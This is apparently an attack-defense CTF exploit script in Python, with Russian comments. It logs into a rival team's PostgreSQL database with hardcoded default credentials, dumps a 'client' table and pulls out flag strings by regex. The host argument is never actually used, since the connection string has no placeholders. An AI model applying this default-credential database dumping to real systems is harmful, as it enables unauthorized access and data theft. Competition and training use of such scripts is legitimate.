#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import re
import requests as req
import psycopg2
from psycopg2.extras import RealDictCursor
import json


def db_connect_new(db, host):
    try:
        connect = psycopg2.connect("dbname='test' user='postgres' host='php_database' password='sibirwtf2019'".format(db=db, host=host))
        return connect, connect.cursor(cursor_factory=RealDictCursor)
    except:
        print('Fatal error: connect database')
        raise


FLAG_FORMAT = r"([a-zA-Z0-9]{31}=)"


def post(site, data, s):
    try:
        data = s.post(site, data=data)
        return data.text
    except req.exceptions.ConnectTimeout:
        return None
    except req.exceptions.ReadTimeout:
        return None
    except req.exceptions.ConnectionError:
        return None


def get(site, s):
    try:
        data = s.get(site)
        return data.text
    except req.exceptions.ConnectTimeout:
        return None
    except req.exceptions.ReadTimeout:
        return None
    except req.exceptions.ConnectionError:
        return None


def find_log(data):
    return re.findall(r'(log:[\d.]+)', data) or []


def find_flags(data):
    return re.findall(FLAG_FORMAT, data) or []


'''
exploit text
'''


def exploit(url):
    flags = []
    s = req.session()
    for db in [('fboard', 'client')]:
        try:
            connect, current_connect = db_connect_new(db[0], url)
            current_connect.execute('select * from {}'.format(db[1]))
            result = current_connect.fetchall()
            flags.extend(find_flags(str(result)))
        except:
            pass
    return flags


if __name__ == "__main__":
    # На вход получаем адрес команды
    url = sys.argv[1]
    # print(url)
    # Возвращаем ответ в консоль, чтобы наш основной процесс перехватил сообщение
    print(exploit(url), flush=True)
